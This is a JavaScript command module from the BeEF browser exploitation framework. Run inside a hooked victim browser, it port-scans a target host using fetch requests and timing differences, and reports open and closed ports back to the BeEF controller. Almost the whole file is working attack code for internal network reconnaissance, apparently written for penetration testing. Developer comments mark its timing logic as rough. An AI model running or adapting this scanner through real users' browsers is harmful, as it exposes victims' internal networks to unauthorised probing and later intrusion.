//
// Copyright (c) 2006-2020 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var blocked_ports = [ 1, 7, 9, 11, 13, 15, 17, 19, 20, 21, 22, 23, 25, 37, 42, 43, 53, 77, 79, 87, 95, 101, 102, 103, 104, 109, 110, 111, 113, 115, 117, 119, 123, 135, 139, 143, 179, 389, 465, 512, 513, 514, 515, 526, 530, 531, 532, 540, 548, 556, 563, 587, 601, 636, 993, 995, 2049, 3659, 4045, 6000, 6665, 6666, 6667, 6668, 6669, 65535 ];
  
  var default_ports = [ 1,5,7,9,15,20,21,22,23,25,26,29,33,37,42,43,53,67,68,69,70,76,79,80,88,90,98,101,106,109,110,111,113,114,115,118,119,123,129,132,133,135,136,137,138,139,143,144,156,158,161,162,168,174,177,194,197,209,213,217,219,220,223,264,315,316,346,353,389,413,414,415,416,440,443,444,445,453,454,456,457,458,462,464,465,466,480,486,497,500,501,516,518,522,523,524,525,526,533,535,538,540,541,542,543,544,545,546,547,556,557,560,561,563,564,625,626,631,636,637,660,664,666,683,740,741,742,744,747,748,749,750,751,752,753,754,758,760,761,762,763,764,765,767,771,773,774,775,776,780,781,782,783,786,787,799,800,801,808,871,873,888,898,901,953,989,990,992,993,994,995,996,997,998,999,1000,1002,1008,1023,1024,1080,8080,8443,8050,3306,5432,1521,1433,3389,10088 ];
  var default_services = {'1':'tcpmux', '5':'rje', '7':'echo', '9':'msn', '15':'netstat', '20':'ftp-data', '21':'ftp', '22':'ssh', '23':'telnet', '25':'smtp', '26':'rsftp', '29':'msgicp', '33':'dsp', '37':'time', '42':'nameserver', '43':'whois', '53':'domain', '67':'dhcps', '68':'dhcpc', '69':'tftp', '70':'gopher', '76':'deos', '79':'finger', '80':'http', '81':'hosts2-ns', '88':'kerberos-sec', '90':'dnsix', '98':'linuxconf', '101':'hostname', '106':'pop3pw', '109':'pop2', '110':'pop3', '111':'rpcbind', '113':'ident', '114':'audio news', '115':'sftp', '118':'sqlserv', '119':'nntp', '123':'ntp', '129':'pwdgen', '132':'cisco-sys', '133':'statsrv', '135':'msrpc', '136':'profile', '137':'netbios-ns', '138':'netbios-dgm', '139':'netbios-ssn', '143':'imap', '144':'news', '156':'sqlserv', '158':'pcmail-srv', '161':'snmp', '162':'snmp trap', '168':'rsvd', '174':'mailq', '177':'xdmcp', '194':'irc', '197':'dls', '199':'smux', '209':'tam', '213':'ipx', '217':'dbase', '219':'uarps', '220':'imap3', '223':'cdc', '264':'bgmp', '315':'dpsi', '316':'decauth', '346':'zserv', '353':'ndsauth', '389':'ldap', '413':'smsp', '414':'infoseek', '415':'bnet', '416':'silver platter', '440':'sgcp', '443':'https', '444':'snpp', '445':'microsoft-ds', '453':'creativeserver', '454':'content server', '456':'macon', '457':'scohelp', '458':'appleqtc', '462':'datasurfsrvsec', '464':'kpasswd5', '465':'smtps', '466':'digital-vrc', '480':'loadsrv', '486':'sstats', '497':'retrospect', '500':'isakmp', '501':'stmf', '515':'printer (spooler lpd)', '516':'videotex', '518':'ntalk', '522':'ulp', '523':'ibm-db2', '524':'ncp', '525':'timed', '526':'tempo', '533':'netwall', '535':'iiop', '538':'gdomap', '540':'uucp', '541':'uucp-rlogin', '542':'commerce', '543':'klogin', '544':'kshell', '545':'ekshell', '546':'dhcpconf', '547':'dhcpserv', '548':'afp', '556':'remotefs', '557':'openvms-sysipc', '560':'rmonitor', '561':'monitor', '563':'snews', '564':'9pfs', '587':'submission', '625':'apple-xsrvr-admin', '626':'apple-imap-admin', '631':'ipp', '636':'ldapssl', '637':'lanserver', '660':'mac-srvr-admin', '664':'secure-aux-bus', '666':'doom', '683':'corba-iiop', '740':'netcp', '741':'netgw', '742':'netrcs', '744':'flexlm', '747':'fujitsu-dev', '748':'ris-cm', '749':'kerberos-adm', '750':'kerberos', '751':'kerberos_master', '752':'qrh', '753':'rrh', '754':'krb_prop', '758':'nlogin', '760':'krbupdate', '761':'kpasswd', '762':'quotad', '763':'cycleserv', '764':'omserv', '765':'webster', '767':'phonebook', '771':'rtip', '773':'submit', '774':'rpasswd', '775':'entomb', '776':'wpages', '780':'wpgs', '781':'hp-collector', '782':'hp-managed-node', '783':'spam assassin', '786':'concert', '787':'qsc', '799':'controlit', '800':'mdbs_daemon', '801':'device', '808':'ccproxy-http', '871':'supfilesrv', '873':'rsync', '888':'access builder', '898':'sun-manageconsole', '901':'samba-swat', '953':'rndc', '989':'ftps-data', '990':'ftps', '992':'telnets', '993':'imaps', '994':'ircs', '995':'pop3s', '996':'xtreelic', '997':'maitrd', '998':'busboy', '999':'garcon', '1000':'cadlock', '1002':'windows-icfw', '1008':'ufsd', '1023':'netvenuechat', '1024':'kdm', '1025':'NFS-or-IIS', '1080':'socks', '1433':'mssql', '1434':'ms-sql-m', '1521 ':'oracle', '1720':'h323q931', '1723':'pptp', '3306':'mysql', '3389':'ms-wbt-server', '4489':'radmin', '5000':'upnp', '5060':'sip', '5432':'postgres', '5900':'vnc', '6000':'x11', '6001':'X11:1', '6446':'mysql-proxy', '8050':'coldfusion', '8080':'http-proxy', '8443':'tomcat', '8888':'sun-answerbook', '9100':'HP JetDirect card', '10000':'snet-sensor-mgmt', '10088':'zend server', '11371':'hkp'};

  var top_ports = [80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993, 5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001, 10000, 5060, 515, 5000, 9100];
  var host = '<%= @ipHost %>';
  var ports = '<%= @ports %>';
  var port = "";
  var ports_list= [];

  function prepare_ports() {
      // Default ports to scan 
    if (ports == 'default') { 
      // nmap most used ports to scan + some new ports
      for ( var i=0; i<default_ports.length; i++)
      {
        ports_list[i] = default_ports[i];
      }
  
    } else if (ports == 'top')	// Top-ports according to Fyodor's research
    {
      // nmap most used ports to scan + some new ports
      for ( var i=0; i<top_ports.length; i++)
      {
        ports_list[i] = top_ports[i];
      }
  
    } else 
    { // Custom ports provided to scan
      if (ports.search(",") > 0) ports_list = ports.split(","); // list of ports
      else if (ports.search("-") > 0) 
      {
        var firstport = parseInt(ports.split("-")[0]); // range of ports, start
        var lastport = parseInt(ports.split("-")[1]); // range of ports, end
        var a = 0;
        for (var i = firstport; i<=lastport; i++)
        {
          ports_list[a] = firstport + a;
          a++;
        }
      } else ports_list = ports.split(); // single port
    }
  }

  function check_blocked(port_to_check) {
      var res = false;
for (var i=0; i<blocked_ports.length; i++) {
          if (port_to_check == blocked_ports[i]) {
              res = true;
          }
      }
      return res;
  }

  // --------------------- Everything below here is working ------------------------------
  // creating some static variables so it will work in theory
  console.log('script isnt broken')
  // var host = "127.0.0.1"
  // var port = "9999"
  // new fetch scan function
  function fetch_scan(hostname, port_) {
      if (check_blocked(parseInt(port_))) {
          console.log('bad port')
          return;
}
     // set up some new abort controller to control timeouts
     var controller = new AbortController();
     var signal = controller.signal;
     setTimeout(() => {controller.abort();}, 5000);
       
     var start = Date.now();
     // setting no-cors here will return a response type of opaque. This means the status code will always be 0 see the following for more details: 
     //  *  https://fetch.spec.whatwg.org/#concept-filtered-response-opaque
     // if we don't set the mode we will always receive the 'blocked by CORS policy' response even if the traffic isn't HTTP based.
     fetch('http://' + hostname + ":"+port_, {
         method: 'GET',
         mode: 'no-cors',
         signal: signal,
     })
         // what to do after fetch returns
         .then(function(res){ 
             // If there is a status returned then Mozilla Firefox 68.5.0esr made a successful connection HTTP based or not
             // and or Chrome received HTTP based traffic.
             if (res.status === 0) {
                 beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open", beef.are.status_success());
             }
           })
               .catch(err => {
                   // Alert BeEF if we are giving up due to the port not responding for N seconds
                   if (signal.aborted === true) {
                       beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": Giving up on port due to Timeout", beef.are.status_success());
       }
                   else {
                       // We need to capture how long it took to fail ASAP to get an idea on timing differences
                       end=Date.now();
                       // Need to grab a basic browser check so that we can not do timing based stuff on Firefox
                       var isFirefox = typeof InstallTrigger !== 'undefined';
                       if (isFirefox === true) {
                           beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
           }
                       else {
               console.log(end-start)
               // This probably needs some timing validation. It was just on local host and was a bit janky...
                           if ((end - start) < 15 ) {
                               beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is closed", beef.are.status_success());
               }
                           else {
                               beef.net.send("<%= @command_url %>", <%= @command_id %>, port_+": port is open but does not communicate via HTTP", beef.are.status_success());
               }
                       }
       }
               })
  }
  // --------------------- Above this line was working ------------------
  prepare_ports();
  function run () {
      if (ports_list.length < 1) {
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=Scan aborted, no valid ports provided to scan');
        return;
      } 
      else {
          desc = '';
          if (ports == 'default' || ports == 'top') {
              desc = ports + 'ports on ';
        }
          beef.net.send('<%= @command_url %>', <%= @command_id %>, 'port=Scanning ' + desc + host+' [ports: ' + ports_list + ']');
      }
      count = 0;
      while (count < ports_list.length) {
          fetch_scan(host, ports_list[count]);
          count+= 1;
      }
// TODO: this is executing too early but doesnt impact the results per say
      if(count >= ports_list.length) {
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Scan Finished');
      }
  }
  run()
});
